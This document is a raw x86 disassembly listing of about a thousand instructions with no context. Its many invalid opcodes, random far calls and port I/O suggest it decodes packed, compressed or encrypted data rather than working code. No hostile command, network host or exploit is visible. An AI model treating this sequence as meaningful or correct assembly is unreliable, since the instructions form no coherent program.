  422c2e:	scas   eax,DWORD PTR es:[edi]
  422c2f:	or     bh,ch
  422c31:	inc    eax
  422c32:	inc    esp
  422c33:	push   ebp
  422c34:	ret    
  422c35:	inc    ebx
  422c36:	in     eax,0x59
  422c38:	scas   eax,DWORD PTR es:[edi]
  422c39:	and    edi,DWORD PTR [edx+0x687a3f0f]
  422c3f:	repz pop ds
  422c41:	mov    ecx,0x9d476a4d
  422c46:	(bad)  
  422c49:	in     eax,dx
  422c4a:	jno    0x422c3b
  422c4c:	push   esp
  422c4d:	or     BYTE PTR [ecx-0x1f],ch
  422c50:	pusha  
  422c51:	mov    BYTE PTR [ecx+0x9],bh
  422c54:	cs mov bl,0xde
  422c57:	scas   eax,DWORD PTR es:[edi]
  422c58:	xchg   edi,eax
  422c59:	(bad)  
  422c5a:	pop    ebp
  422c5b:	rcr    DWORD PTR [ebx],cl
  422c5d:	call   0x107e:0xe50bde0e
  422c64:	sbb    DWORD PTR [ecx],edi
  422c66:	sub    esi,DWORD PTR [esi]
  422c68:	rol    BYTE PTR ds:0x716ce6e9,cl
  422c6e:	xlat   BYTE PTR ds:[ebx]
  422c6f:	lods   eax,DWORD PTR ds:[esi]
  422c70:	out    dx,eax
  422c71:	xor    BYTE PTR [edi-0x59],0x27
  422c75:	inc    ecx
  422c76:	loop   0x422bff
  422c78:	ins    DWORD PTR es:[edi],dx
  422c79:	push   eax
  422c7a:	cmp    al,0xa6
  422c7c:	inc    edi
  422c7d:	sub    bh,dl
  422c7f:	sbb    esi,DWORD PTR [edi+0x51]
  422c82:	cmp    BYTE PTR [esi],ah
  422c84:	enter  0xdc97,0x8c
  422c88:	mov    WORD PTR [ecx-0x4a],es
  422c8b:	loopne 0x422c98
  422c8d:	and    al,0x5c
  422c8f:	dec    ecx
  422c90:	pop    es
  422c91:	push   ebp
  422c92:	(bad)  
  422c93:	cmp    dl,ah
	...
  422d11:	add    BYTE PTR [eax],al
  422d13:	add    BYTE PTR [esi-0x8131a83],cl
  422d19:	cld    
  422d1a:	(bad)  
  422d1b:	jg     0x422d8f
  422d1d:	and    eax,0x9b5a1474
  422d22:	pop    ecx
  422d23:	loop   0x422d8d
  422d25:	ret    0x1
  422d28:	imul   eax,DWORD PTR [edi],0xf3420000
  422d2e:	and    bh,BYTE PTR [esp+esi*8]
  422d31:	push   0xb
  422d33:	lock sub al,0xcb
  422d36:	arpl   si,bp
  422d38:	pop    ecx
  422d39:	sahf   
  422d3a:	out    dx,eax
  422d3b:	mov    ch,0x93
  422d3d:	xor    al,0x0
  422d3f:	push   esi
  422d40:	mov    edx,0x1e16edbb
  422d45:	push   ecx
  422d46:	mov    eax,0x651f3fc7
  422d4b:	scas   al,BYTE PTR es:[edi]
  422d4c:	stos   DWORD PTR es:[edi],eax
  422d4d:	add    BYTE PTR [edi-0x33f9fa59],0xc1
  422d54:	out    dx,al
  422d55:	inc    esp
  422d56:	out    0xfc,eax
  422d58:	xchg   DWORD PTR [ebx-0x73e509a2],edx
  422d5e:	je     0x422d7c
  422d60:	test   eax,0x874c5db4
  422d65:	mov    eax,0x8971e1e4
  422d6a:	mov    WORD PTR [ecx+0x21],es
  422d6d:	retf   0xfba5
  422d70:	stos   BYTE PTR es:[edi],al
  422d71:	and    ch,BYTE PTR [ebp-0x78622589]
  422d77:	sub    BYTE PTR [edi],dh
  422d79:	sub    ebp,esi
  422d7b:	shr    BYTE PTR [edx+ecx*8],cl
  422d7e:	outs   dx,BYTE PTR ds:[esi]
  422d7f:	push   eax
  422d80:	lods   al,BYTE PTR ds:[esi]
  422d81:	dec    ebp
  422d82:	push   ecx
  422d83:	addr16 mov ah,0x16
  422d86:	jp     0x422d97
  422d88:	repz fs cwde 
  422d8b:	fwait
  422d8c:	sbb    eax,0x458e87f4
  422d91:	repz jno 0x422d14
  422d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d95:	fstp   st(0)
  422d97:	repnz loopne 0x422df0
  422d9a:	sbb    ch,BYTE PTR [esp+eiz*2+0x56]
  422d9e:	pop    esp
  422d9f:	sub    BYTE PTR [edi],cl
  422da1:	mov    ch,0xd7
  422da3:	and    bl,BYTE PTR [ecx-0x59713f38]
  422da9:	ins    DWORD PTR es:[edi],dx
  422daa:	dec    edx
  422dab:	push   esp
  422dac:	jae    0x422db8
  422dae:	pop    edi
  422daf:	push   ds
  422db0:	push   0x3
  422db2:	fwait
  422db3:	jecxz  0x422d6f
  422db5:	xor    edi,esi
  422db7:	cld    
  422db8:	ror    esi,0xfe
  422dbb:	test   al,0xd8
  422dbd:	stc    
  422dbe:	cli    
  422dbf:	fsub   st,st(1)
  422dc1:	lock cwde 
  422dc3:	push   esi
  422dc4:	inc    ebx
  422dc5:	stos   DWORD PTR es:[edi],eax
  422dc6:	push   ds
  422dc7:	xor    BYTE PTR [ebp+eiz*1+0x70ee6e08],ah
  422dce:	clc    
  422dcf:	cmp    eax,edi
  422dd1:	jl     0x422d5b
  422dd3:	stos   BYTE PTR es:[edi],al
  422dd4:	xor    BYTE PTR [edx-0x8],dh
  422dd7:	bound  ebx,QWORD PTR [eax+0x78]
  422dda:	sbb    al,BYTE PTR [ecx]
  422ddc:	mov    dh,0x8e
  422dde:	and    cl,al
  422de0:	pop    eax
  422de1:	arpl   WORD PTR [ebp+eiz*1-0x80],bx
  422de5:	fimul  WORD PTR [edx+0x6125ec5b]
  422deb:	out    dx,al
  422dec:	test   DWORD PTR [edx+0x1c],esp
  422def:	(bad)  
  422df1:	jmp    0x422ded
  422df3:	or     DWORD PTR [edi-0x15],ebx
  422df6:	daa    
  422df7:	jns    0x422dba
  422df9:	sub    ch,BYTE PTR [edx+0x38]
  422dfc:	dec    ecx
  422dfd:	inc    esi
  422dfe:	ds iret 
  422e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e01:	adc    BYTE PTR [edx],bh
  422e03:	popf   
  422e04:	inc    esi
  422e05:	cld    
  422e06:	in     eax,0x4
  422e08:	sbb    DWORD PTR [ebp+0x3c],0x898af146
  422e0f:	push   cs
  422e10:	int3   
  422e11:	mov    ebx,DWORD PTR [ebx-0x4f]
  422e14:	sub    BYTE PTR [esi+0x979f5c2],ah
  422e1a:	cmp    edi,DWORD PTR [ecx]
  422e1c:	adc    ebp,DWORD PTR [esi]
  422e1e:	popa   
  422e1f:	xchg   ebp,eax
  422e20:	add    eax,0x2ea19e7a
  422e25:	out    0xf,eax
  422e27:	jp     0x422db6
  422e29:	out    dx,al
  422e2a:	retf   
  422e2b:	imul   ecx,eax,0x4a
  422e2e:	xchg   edx,eax
  422e2f:	popf   
  422e30:	outs   dx,DWORD PTR ds:[esi]
  422e31:	xor    esp,DWORD PTR [ebp+0xf]
  422e34:	inc    edi
  422e35:	or     ebp,DWORD PTR [eax+edx*4]
  422e38:	inc    ebp
  422e39:	push   ss
  422e3a:	mov    esi,0x9e7a0140
  422e3f:	icebp  
  422e40:	mov    ds:0xeb5d0932,al
  422e45:	cmp    BYTE PTR [ebp+0x2916fac5],bh
  422e4b:	xor    DWORD PTR [ecx+0x3f],0xffffff8e
  422e4f:	in     al,dx
  422e50:	sbb    dh,bl
  422e52:	sbb    cl,cl
  422e54:	jge    0x422e72
  422e56:	xchg   edi,eax
  422e57:	rol    ebp,1
  422e59:	lds    edi,FWORD PTR [esi]
  422e5b:	mov    ?,esp
  422e5d:	out    dx,eax
  422e5e:	push   esp
  422e5f:	scas   eax,DWORD PTR es:[edi]
  422e60:	out    0x2a,al
  422e62:	cmp    al,0xae
  422e64:	out    0xd0,eax
  422e66:	xchg   edx,eax
  422e67:	pop    ebp
  422e68:	pop    ecx
  422e69:	fwait
  422e6a:	test   al,0x4d
  422e6c:	adc    eax,ecx
  422e6e:	retf   0x20b2
  422e71:	xor    eax,DWORD PTR [edx]
  422e73:	pop    ds
  422e74:	lahf   
  422e75:	dec    esi
  422e76:	push   ebp
  422e77:	pop    esp
  422e78:	out    0x60,eax
  422e7a:	cmp    ch,ah
  422e7c:	loop   0x422e79
  422e7e:	mov    al,ds:0x6ff21407
  422e83:	dec    ebp
  422e84:	sahf   
  422e85:	hlt    
  422e86:	inc    ecx
  422e87:	mov    ebp,DWORD PTR [eax]
  422e89:	xor    BYTE PTR [ebx],dh
  422e8b:	enter  0x44f4,0x32
  422e8f:	cmp    ebx,0xffffffeb
  422e92:	jns    0x422f0d
  422e94:	mov    ah,0x1e
  422e96:	jg     0x422e7a
  422e98:	ficomp DWORD PTR [esi]
  422e9a:	lods   al,BYTE PTR ds:[esi]
  422e9b:	dec    esp
  422e9c:	ins    DWORD PTR es:[edi],dx
  422e9d:	repnz aam 0x72
  422ea0:	bound  eax,QWORD PTR ds:0x33926378
  422ea6:	icebp  
  422ea7:	mov    BYTE PTR [esi-0x7f],cl
  422eaa:	adc    ch,dh
  422eac:	add    cl,BYTE PTR ds:0x6c83c1ff
  422eb2:	lea    eax,[edi+0x31d42bd3]
  422eb8:	mov    ebp,0x4e1a352d
  422ebd:	push   0xbec3771e
  422ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ec3:	inc    esi
  422ec4:	pusha  
  422ec5:	int3   
  422ec6:	aas    
  422ec7:	inc    ebx
  422ec8:	cdq    
  422ec9:	addr16 xor bl,cl
  422ecc:	inc    esi
  422ecd:	fwait
  422ece:	pop    esi
  422ecf:	retf   0x6f93
  422ed2:	cmp    al,0x8c
  422ed4:	mov    BYTE PTR [eax-0x22],bh
  422ed7:	ret    0xa8d3
  422eda:	xchg   ebp,eax
  422edb:	dec    esp
  422edc:	add    bh,ch
  422ede:	and    DWORD PTR [ebp-0x22],0xfffffffe
  422ee2:	or     al,BYTE PTR [ebx+ebp*2-0x31]
  422ee6:	rol    BYTE PTR [ebx+0x1d],0xb7
  422eea:	(bad)  
  422eeb:	lods   al,BYTE PTR ds:[esi]
  422eec:	nop
  422eed:	mov    ds:0x94a3b558,eax
  422ef2:	retf   0x2787
  422ef5:	pop    esi
  422ef6:	repz ror cl,0xdf
  422efa:	cld    
  422efb:	jl     0x422e8f
  422efd:	fdiv   QWORD PTR [eax]
  422eff:	fst    DWORD PTR [edx]
  422f01:	or     ah,BYTE PTR [edi-0x68f91f29]
  422f07:	dec    ecx
  422f08:	mov    edi,0xe1439de6
  422f0d:	into   
  422f0e:	mov    ds,WORD PTR [esi]
  422f10:	mov    bh,0xa3
  422f12:	inc    edi
  422f13:	jle    0x422f8e
  422f15:	out    dx,al
  422f16:	push   ebp
  422f17:	mov    ch,0x16
  422f19:	sub    eax,0x6d09bd05
  422f1e:	fsubr  DWORD PTR [ecx]
  422f20:	sub    al,0xfa
  422f22:	cmc    
  422f23:	popf   
  422f24:	xchg   edx,eax
  422f25:	sahf   
  422f26:	(bad)  
  422f27:	push   esp
  422f28:	pushw  0xffc4
  422f2b:	sub    cl,BYTE PTR [esi]
  422f2d:	popf   
  422f2e:	rcl    BYTE PTR [ecx-0x2e6c99f5],cl
  422f34:	(bad)  
  422f35:	adc    DWORD PTR [edi],ecx
  422f37:	add    al,BYTE PTR [esi]
  422f39:	mov    ebx,0x41df3710
  422f3e:	data16 sub al,0xa2
  422f41:	(bad)  
  422f42:	test   DWORD PTR [edx-0x28],0xe3c678de
  422f49:	mov    ebp,0x36f2c3c
  422f4e:	cwde   
  422f4f:	dec    edi
  422f50:	mov    al,0x24
  422f52:	arpl   WORD PTR [edx],cx
  422f54:	sbb    eax,0xcb416dac
  422f59:	mov    edx,0x2079b29d
  422f5e:	stos   BYTE PTR es:[edi],al
  422f5f:	dec    esi
  422f60:	cmp    DWORD PTR [esi-0x51728d7a],esi
  422f66:	int    0xc2
  422f68:	out    dx,al
  422f69:	cmp    edx,DWORD PTR [ebx-0x3035dcaa]
  422f6f:	dec    eax
  422f70:	in     al,dx
  422f71:	out    0x65,eax
  422f73:	inc    edi
  422f74:	scas   eax,DWORD PTR es:[edi]
  422f75:	mov    bl,0x9a
  422f77:	lea    ebx,[ecx-0x76]
  422f7a:	ret    
  422f7b:	adc    edx,DWORD PTR [ebx+0x4b4995bf]
  422f81:	pop    edi
  422f82:	call   0xd347:0x9d68a7fc
  422f89:	jle    0x422f8e
  422f8b:	clc    
  422f8c:	pop    esp
  422f8d:	rcl    DWORD PTR [ecx+0x32],cl
  422f90:	xlat   BYTE PTR ds:[ebx]
  422f91:	pop    esp
  422f92:	lods   eax,DWORD PTR ds:[esi]
  422f93:	xor    dh,bl
  422f95:	adc    ch,dh
  422f97:	jae    0x422fcb
  422f99:	ja     0x422f49
  422f9b:	xlat   BYTE PTR ds:[ebx]
  422f9c:	mov    ebx,0xe1bd715f
  422fa1:	iret   
  422fa2:	xor    ebx,DWORD PTR [edx-0x74e5ff63]
  422fa8:	mov    ds:0xc4b6275,eax
  422fad:	imul   ecx,DWORD PTR [esi-0x1a9cbd9],0x112e2079
  422fb7:	dec    ecx
  422fb8:	add    DWORD PTR [ebx-0x67],eax
  422fbb:	cmp    BYTE PTR [eax],bh
  422fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fbe:	aad    0x1d
  422fc0:	pcmpeqw mm2,QWORD PTR [edi+0x68a53424]
  422fc7:	data16 and si,si
  422fcb:	push   cs
  422fcc:	sub    eax,0x2898ab03
  422fd1:	xor    dh,BYTE PTR [esi+0x516eab5a]
  422fd7:	mov    esp,0x7058e508
  422fdc:	mov    ebp,0xb9d233a0
  422fe1:	bound  edx,QWORD PTR [edi-0x41]
  422fe4:	outs   dx,BYTE PTR ds:[esi]
  422fe5:	push   ebx
  422fe6:	jge    0x422fd0
  422fe8:	retf   0x7ea7
  422feb:	sub    DWORD PTR [edi+0x70],ebp
  422fee:	sti    
  422fef:	sub    bh,BYTE PTR [ebp-0x177a31e6]
  422ff5:	adc    BYTE PTR [ebx],0x50
  422ff8:	lds    ebx,FWORD PTR [eax]
  422ffa:	mov    al,ds:0x1ed59edb
  422fff:	ins    BYTE PTR es:[edi],dx
  423000:	inc    eax
  423001:	mov    ds:0xc27b0cc2,eax
  423006:	das    
  423007:	das    
  423008:	aam    0x9c
  42300a:	in     al,0xe5
  42300c:	lock lods al,BYTE PTR ds:[esi]
  42300e:	dec    esi
  42300f:	mov    ah,0x1e
  423011:	pavgw  mm2,mm2
  423014:	pop    edi
  423015:	jnp    0x423047
  423017:	inc    ebx
  423018:	cmp    DWORD PTR [ebx],esp
  42301a:	xor    eax,0xf870c097
  42301f:	gs dec edi
  423021:	mov    ds,WORD PTR [eax+0x36]
  423024:	dec    ebp
  423025:	jnp    0x423074
  423027:	add    edi,esi
  423029:	and    al,0x9
  42302b:	pop    esi
  42302c:	xor    bl,BYTE PTR [ebx+0x678d3378]
  423032:	and    esp,DWORD PTR [edx-0x7f43152e]
  423038:	inc    esi
  423039:	cmc    
  42303a:	pop    ds
  42303b:	test   eax,0xc48ac5a8
  423040:	scas   eax,DWORD PTR es:[edi]
  423041:	mov    ds:0x85d73f49,al
  423046:	sub    ah,dl
  423048:	inc    esi
  423049:	push   esi
  42304a:	mov    eax,ds:0x94dfe641
  42304f:	aas    
  423050:	pop    edi
  423051:	cs call 0xcc65c93f
  423057:	aas    
  423058:	cmp    dl,ah
  42305a:	pop    ebx
  42305b:	pop    ss
  42305c:	push   0xffffffd0
  42305e:	out    dx,al
  42305f:	mov    ah,dh
  423061:	stos   DWORD PTR es:[edi],eax
  423062:	clc    
  423063:	call   0xcc086de4
  423068:	dec    ebp
  423069:	popa   
  42306a:	mov    ch,0x90
  42306c:	inc    ecx
  42306d:	ins    BYTE PTR es:[edi],dx
  42306e:	mov    ebp,0xd6b61a29
  423073:	out    dx,eax
  423074:	ret    
  423075:	pop    esp
  423076:	mov    ebp,DWORD PTR [edi-0x5d]
  423079:	and    DWORD PTR [esi-0x6b],edx
  42307c:	mov    edx,0x6042e40
  423081:	push   edx
  423082:	into   
  423083:	lock mov esi,ebp
  423086:	out    dx,eax
  423087:	pop    esi
  423088:	pop    edi
  423089:	pop    ebp
  42308a:	ins    DWORD PTR es:[edi],dx
  42308b:	inc    edx
  42308c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42308d:	xchg   esi,eax
  42308e:	push   ebx
  42308f:	jb     0x42309a
  423091:	ins    DWORD PTR es:[edi],dx
  423092:	or     DWORD PTR ds:0xfdabe3db,edi
  423098:	push   edi
  423099:	loop   0x423071
  42309b:	and    BYTE PTR [ebx],al
  42309d:	mov    ah,0xf6
  42309f:	loopne 0x42310d
  4230a1:	lock retf 
  4230a3:	sub    al,0x5b
  4230a5:	int3   
  4230a6:	dec    edx
  4230a7:	repz in al,dx
  4230a9:	popa   
  4230aa:	out    0x7d,al
  4230ac:	add    esi,DWORD PTR [esi+0x652c271a]
  4230b2:	mov    esi,0xf743eb2d
  4230b7:	lahf   
  4230b8:	dec    ecx
  4230b9:	fs xchg edi,eax
  4230bb:	aam    0xe5
  4230bd:	jb     0x42312f
  4230bf:	cmp    al,0x1b
  4230c1:	test   eax,0x17f99c04
  4230c6:	repnz repnz arpl WORD PTR [edi-0x51],dx
  4230cb:	mov    edx,0xa3a3d12e
  4230d0:	(bad)  
  4230d1:	mov    dl,0xec
  4230d3:	shl    cl,cl
  4230d5:	ret    
  4230d6:	fadd   QWORD PTR [ecx-0x3f]
  4230d9:	shl    al,1
  4230db:	jmp    0x4230c8
  4230dd:	pop    eax
  4230de:	jle    0x423123
  4230e0:	sar    dh,cl
  4230e2:	scas   al,BYTE PTR es:[edi]
  4230e3:	aas    
  4230e4:	adc    ecx,DWORD PTR [eax+0x27]
  4230e7:	mov    esi,0xb143cbc5
  4230ec:	xor    al,ah
  4230ee:	nop
  4230ef:	jge    0x423084
  4230f1:	mov    ecx,0x9d9195f7
  4230f6:	and    eax,ecx
  4230f8:	fsub   QWORD PTR [edx]
  4230fa:	stos   BYTE PTR es:[edi],al
  4230fb:	dec    ebx
  4230fc:	ss cmp ecx,edi
  4230ff:	mov    ah,al
  423101:	cmp    ebp,DWORD PTR [ecx+0x1e28699b]
  423107:	xor    DWORD PTR [esp+ebx*1],0xffffffd3
  42310b:	inc    edi
  42310c:	lock imul eax,DWORD PTR [edi],0x2404af1e
  423113:	jl     0x423097
  423115:	movaps xmm2,XMMWORD PTR [edx-0x52]
  423119:	dec    ebx
  42311a:	loop   0x4230e3
  42311c:	adc    ecx,edx
  42311e:	ret    0xa338
  423121:	loop   0x423171
  423123:	mov    edi,0xff15e75b
  423128:	pop    ss
  423129:	addr16 push edi
  42312b:	mov    ds:0x56be1762,al
  423130:	rcr    BYTE PTR [ecx-0x79],0xf6
  423134:	ins    DWORD PTR es:[edi],dx
  423135:	ds inc ecx
  423137:	rcr    BYTE PTR [edi],cl
  423139:	dec    esi
  42313a:	mov    ecx,0xac4acdf4
  42313f:	push   ecx
  423140:	fcomp  DWORD PTR [edx+0xa]
  423144:	lods   al,BYTE PTR ds:[esi]
  423145:	mov    ebp,0xfffd6087
  42314a:	sbb    eax,0xbd2bde9f
  42314f:	mov    BYTE PTR [ecx],dh
  423151:	cmp    eax,0x1c0117b4
  423156:	push   ds
  423157:	pusha  
  423158:	xor    al,BYTE PTR es:[eax-0x4010bb16]
  42315f:	ja     0x423125
  423161:	mov    cl,0x51
  423163:	inc    ebp
  423164:	retf   0x2296
  423167:	sbb    esp,eax
  423169:	mov    ch,0x5e
  42316b:	dec    ecx
  42316c:	pop    ds
  42316d:	dec    ebp
  42316e:	test   al,0xde
  423170:	(bad)  
  423171:	jmp    ebp
  423173:	mov    edi,DWORD PTR [edx+eiz*4-0x5b4458fe]
  42317a:	ins    DWORD PTR es:[edi],dx
  42317b:	call   0x772857b7
  423180:	cmp    eax,0xae503172
  423185:	add    al,0x5d
  423187:	sbb    ebx,ebx
  423189:	(bad)  [eax-0x27]
  42318c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42318d:	shl    BYTE PTR [ebp+0x2cdc3d8d],1
  423193:	fdivr  DWORD PTR [ecx+0x3cf18284]
  423199:	xor    ecx,DWORD PTR [edi+0x6764ed8]
  42319f:	cmp    DWORD PTR [ebx-0x7a],edx
  4231a2:	lahf   
  4231a3:	in     al,0x92
  4231a5:	bound  ebx,QWORD PTR [bp+si-0x79]
  4231a9:	xor    eax,0xb956f3e
  4231ae:	lods   al,BYTE PTR ds:[esi]
  4231af:	imul   edi,ebx,0x4de18364
  4231b5:	push   eax
  4231b6:	(bad)  
  4231b7:	mov    ecx,0x54d252e2
  4231bc:	sti    
  4231bd:	add    esi,DWORD PTR [esi]
  4231bf:	fst    QWORD PTR [eax+0x5d7386dd]
  4231c5:	mov    edx,0xd64dbcea
  4231ca:	dec    esp
  4231cb:	test   BYTE PTR [esi],bh
  4231cd:	stos   DWORD PTR es:[edi],eax
  4231ce:	mov    ecx,esp
  4231d0:	lds    eax,FWORD PTR [eax]
  4231d2:	stc    
  4231d3:	push   eax
  4231d4:	cli    
  4231d5:	inc    esi
  4231d6:	add    ecx,DWORD PTR [esi]
  4231d8:	popf   
  4231d9:	rol    cl,1
  4231db:	push   edi
  4231dc:	retf   
  4231dd:	mov    ds:0x5ad6812b,al
  4231e2:	xchg   esp,eax
  4231e3:	push   es
  4231e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231e5:	cs lahf 
  4231e7:	nop
  4231e8:	mov    ds:0x1a957ee0,al
  4231ed:	adc    BYTE PTR [edi],bl
  4231ef:	mov    al,BYTE PTR [edx]
  4231f1:	pop    ecx
  4231f2:	and    ecx,ebp
  4231f4:	cli    
  4231f5:	or     DWORD PTR [eax-0x343800ed],0x755f169
  4231ff:	div    DWORD PTR [ecx+eax*4+0x7190c2c9]
  423206:	push   edx
  423207:	rcr    BYTE PTR [ebx],1
  423209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42320a:	sub    esi,DWORD PTR [esp+esi*2-0x35b482e7]
  423211:	test   al,ch
  423213:	jmp    0x42321e
  423215:	xchg   ecx,eax
  423216:	and    DWORD PTR [edi-0x68],eax
  423219:	jmp    0x10b6:0x7cc17709
  423220:	mov    al,0x44
  423222:	push   ecx
  423223:	push   ecx
  423224:	rcl    al,0x96
  423227:	add    cl,BYTE PTR [eax+0x33de3454]
  42322d:	nop
  42322e:	out    0x8a,eax
  423230:	sbb    esp,DWORD PTR [ebx+0x423d2c95]
  423236:	outs   dx,BYTE PTR ds:[esi]
  423237:	jne    0x423202
  423239:	adc    al,0x22
  42323b:	xchg   ebx,eax
  42323c:	xchg   edx,eax
  42323d:	mov    eax,0xc6cc1f9f
  423242:	rol    DWORD PTR [edx-0x25],cl
  423245:	loopne 0x423229
  423247:	lds    edi,FWORD PTR [edx-0x6c]
  42324a:	push   ecx
  42324b:	cmp    cl,BYTE PTR [ecx-0x5368cde7]
  423251:	icebp  
  423252:	push   0x2d
  423254:	mul    BYTE PTR [edi]
  423256:	in     eax,dx
  423257:	mov    DWORD PTR [ebx-0x62],ebp
  42325a:	imul   edi,DWORD PTR [esi+0x45f3eb55],0xce659f98
  423264:	push   ebp
  423265:	push   eax
  423266:	sbb    eax,0xa6528e7f
  42326b:	enter  0xacab,0x96
  42326f:	arpl   di,sp
  423271:	cmp    DWORD PTR [eax],esi
  423273:	inc    ecx
  423274:	mov    dl,0xb7
  423276:	push   ebx
  423277:	jo     0x423255
  423279:	pop    esi
  42327a:	jge    0x4232bf
  42327c:	sub    BYTE PTR [ebp+0x5fda7c25],bh
  423282:	mov    ds:0xcd1018ac,al
  423287:	dec    edx
  423288:	test   eax,0xf9c589c0
  42328d:	mov    bh,BYTE PTR [eax]
  42328f:	std    
  423290:	rcl    DWORD PTR [edx+0x1e2ca632],1
  423296:	(bad)  
  423297:	fmul   DWORD PTR [ecx]
  423299:	(bad)  
  42329a:	jmp    0xd143:0xbe6136
  4232a1:	push   es
  4232a2:	repnz sti 
  4232a4:	ficom  DWORD PTR [edi-0x7bc29ad0]
  4232aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ab:	jb     0x42327f
  4232ad:	ds stc 
  4232af:	mov    esp,DWORD PTR [eax]
  4232b1:	nop
  4232b2:	enter  0x9dfd,0x50
  4232b6:	add    DWORD PTR [ebx],ecx
  4232b8:	loope  0x423256
  4232ba:	inc    ebp
  4232bb:	shl    DWORD PTR ds:0x3ce2025e,0x85
  4232c2:	icebp  
  4232c3:	shl    DWORD PTR [edx-0x3be6418b],1
  4232c9:	or     edi,edx
  4232cb:	rcl    BYTE PTR [eax],1
  4232cd:	pop    DWORD PTR [edx+0x0]
  4232d0:	xchg   ebp,eax
  4232d1:	lea    esi,[ebx-0x4e]
  4232d4:	or     eax,0x98457767
  4232d9:	retf   
  4232da:	(bad)  
  4232db:	retf   0xff46
  4232de:	mov    bh,0x5a
  4232e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232e1:	xlat   BYTE PTR ds:[ebx]
  4232e2:	mov    eax,es
  4232e4:	leave  
  4232e5:	adc    eax,DWORD PTR [ecx-0x6c2c802f]
  4232eb:	lods   eax,DWORD PTR ds:[esi]
  4232ec:	xor    ch,cl
  4232ee:	int3   
  4232ef:	pushf  
  4232f0:	and    eax,0x9c49dde0
  4232f5:	push   edx
  4232f6:	jp     0x4232b4
  4232f8:	mov    ch,0xf0
  4232fa:	dec    esp
  4232fb:	aad    0xac
  4232fd:	mov    ch,0xdc
  4232ff:	sbb    ebx,DWORD PTR [ebp+0x7a]
  423302:	add    al,0x7e
  423304:	aam    0xcf
  423306:	adc    esi,DWORD PTR [ecx-0x40e58d2f]
  42330c:	pop    ebp
  42330d:	cmc    
  42330e:	add    eax,0x5210687e
  423313:	ds jae 0x42329f
  423316:	(bad)  
  423317:	jnp    0x423312
  423319:	js     0x4232b8
  42331b:	stos   DWORD PTR es:[edi],eax
  42331c:	call   0x874b:0x48914f35
  423323:	pop    ds
  423324:	jecxz  0x4232c0
  423326:	out    0x98,al
  423328:	(bad)  
  423329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42332a:	cli    
  42332b:	xchg   DWORD PTR [ebp-0x25],ecx
  42332e:	js     0x4232cc
  423330:	mov    ch,0xc6
  423332:	test   eax,0x33435d61
  423337:	jg     0x4232ce
  423339:	mov    dl,0x18
  42333b:	loope  0x42337c
  42333d:	popf   
  42333e:	or     al,0x95
  423340:	sbb    BYTE PTR [ecx+0x45],bh
  423343:	mov    al,0xb9
  423345:	mov    esp,0xa3f11842
  42334a:	arpl   WORD PTR [di-0x60],si
  42334e:	ror    BYTE PTR [edx+0xd25999f],0xc5
  423355:	cdq    
  423356:	adc    cl,BYTE PTR [eax+ebp*2+0x5f9ed874]
  42335d:	inc    eax
  42335e:	add    eax,0x4038fffe
  423363:	dec    BYTE PTR [edx+0x31]
  423366:	or     BYTE PTR [ebp+0x4f],al
  423369:	mov    DWORD PTR ds:0x31c2cbcf,ebx
  42336f:	aam    0x64
  423371:	fimul  DWORD PTR [esi-0x30]
  423374:	jl     0x423381
  423376:	cmp    eax,eax
  423378:	jb     0x423392
  42337a:	fwait
  42337b:	inc    ebp
  42337c:	out    0x80,al
  42337e:	sahf   
  42337f:	retf   
  423380:	xor    DWORD PTR [edx+0x7ffe877a],esp
  423386:	add    al,0x18
  423388:	retf   
  423389:	dec    edx
  42338a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42338b:	nop
  42338c:	cmp    edi,DWORD PTR [esi-0x7c]
  42338f:	and    bl,dl
  423391:	xor    al,0xda
  423393:	mov    eax,0x358ec038
  423398:	outs   dx,BYTE PTR ds:[esi]
  423399:	ja     0x4233b1
  42339b:	(bad)  
  42339d:	(bad)  
  42339e:	sar    edi,1
  4233a0:	js     0x42339d
  4233a2:	push   ecx
  4233a3:	stos   DWORD PTR es:[edi],eax
  4233a4:	push   0xffffffc6
  4233a6:	or     bl,BYTE PTR [ebp-0x74]
  4233a9:	sbb    eax,0x180dbc2e
  4233ae:	and    al,0x53
  4233b0:	fld    QWORD PTR [ebx-0x5a]
  4233b3:	lds    edx,FWORD PTR [esi]
  4233b5:	sbb    dh,BYTE PTR cs:[edi-0x68d88784]
  4233bc:	dec    eax
  4233bd:	sub    al,0x51
  4233bf:	sbb    ebx,esp
  4233c1:	or     al,ah
  4233c3:	dec    esp
  4233c4:	sbb    al,0x88
  4233c6:	pop    esi
  4233c7:	jmp    0x7615:0x65ad1472
  4233ce:	sub    eax,0x61873024
  4233d3:	sub    ah,cl
  4233d5:	(bad)  
  4233d6:	push   ebp
  4233d7:	in     al,0x84
  4233d9:	jae    0x4233a6
  4233db:	(bad)  
  4233dc:	cwde   
  4233dd:	mov    dh,0xd3
  4233df:	push   ss
  4233e0:	std    
  4233e1:	(bad)  
  4233e2:	out    dx,al
  4233e3:	ins    BYTE PTR es:[edi],dx
  4233e4:	adc    cl,BYTE PTR [edi]
  4233e6:	xor    bh,BYTE PTR [edi]
  4233e8:	test   BYTE PTR ds:0xdd17a223,al
  4233ee:	inc    edi
  4233ef:	(bad)  [esi+0x51b33688]
  4233f5:	mov    ecx,0xaac99020
  4233fa:	sub    esi,DWORD PTR [esi]
  4233fc:	aas    
  4233fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233fe:	repnz fcmovu st,st(3)
  423401:	fwait
  423402:	mov    eax,0xfb16b480
  423407:	pop    esi
  423408:	adc    DWORD PTR [ecx+eiz*1],0xfffffff9
  42340c:	jno    0x423423
  42340e:	cmp    eax,0x9397602d
  423413:	daa    
  423414:	call   0xef42227b
  423419:	cmp    eax,0x74f6d546
  42341e:	xchg   ecx,eax
  42341f:	ins    DWORD PTR es:[edi],dx
  423420:	push   ebx
  423421:	test   DWORD PTR [esi+0x62],ebp
  423424:	into   
